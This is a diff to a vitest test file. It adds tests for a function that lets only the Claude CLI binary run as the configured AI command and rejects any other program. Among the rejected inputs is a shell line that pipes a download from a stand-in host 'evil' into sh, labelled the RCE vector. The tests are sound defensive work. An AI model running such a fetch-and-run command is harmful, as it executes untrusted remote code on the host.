@@ -1,5 +1,21 @@
 import { describe, it, expect } from 'vitest';
-import { triageBody } from './ai';
+import { triageBody, aiCommandReason } from './ai';
+
+describe('aiCommandReason (AI binary allow-list)', () => {
+  it('allows the Claude CLI, bare or by absolute path', () => {
+    expect(aiCommandReason(['claude', '-p', '{prompt}'])).toBeNull();
+    expect(aiCommandReason(['/usr/bin/claude', '-p', '{prompt}'])).toBeNull();
+    expect(aiCommandReason(['/usr/local/bin/claude'])).toBeNull();
+  });
+
+  it('rejects any other program — the RCE vector', () => {
+    expect(aiCommandReason(['/bin/sh', '-c', 'curl evil|sh'])).toMatch(/Claude CLI/);
+    expect(aiCommandReason(['curl', 'evil'])).toMatch(/Claude CLI/);
+    expect(aiCommandReason(['bash'])).toMatch(/Claude CLI/);
+    expect(aiCommandReason([])).toMatch(/No AI command/);
+    expect(aiCommandReason(undefined)).toMatch(/No AI command/);
+  });
+});
 
 // Shape of the 2026-09-30 eSign lure: heavy inline CSS, the Open link deep in the markup,
 // then ~70 spacer divs and a stolen thread.
